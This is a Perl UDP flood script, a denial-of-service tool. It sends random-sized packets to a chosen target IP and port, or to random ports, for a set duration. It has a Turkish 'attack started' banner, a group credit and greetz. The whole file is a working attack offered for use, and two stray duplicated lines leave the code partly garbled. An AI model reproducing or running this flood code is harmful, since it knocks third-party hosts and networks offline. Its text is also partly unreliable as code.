use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
use Socket;
use strict;
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "./lunixly.pl <ip> <port> $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print RED <<EOTEXT;
                 SALDIRI BAŞLADI -*-*-*-*-*-*-*-*-*-*-*-*-*-
                        Lunixly ETERNAL GRUOP MEMBERS 
                            
EOTEXT
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
n1ga ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
n1ga ") . "\n";
        print "Saldırıyı Çekmek Icın Ctrl-C\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
##
#greetz:Scorpiol ~ Fanetsa ~ B0RU70
##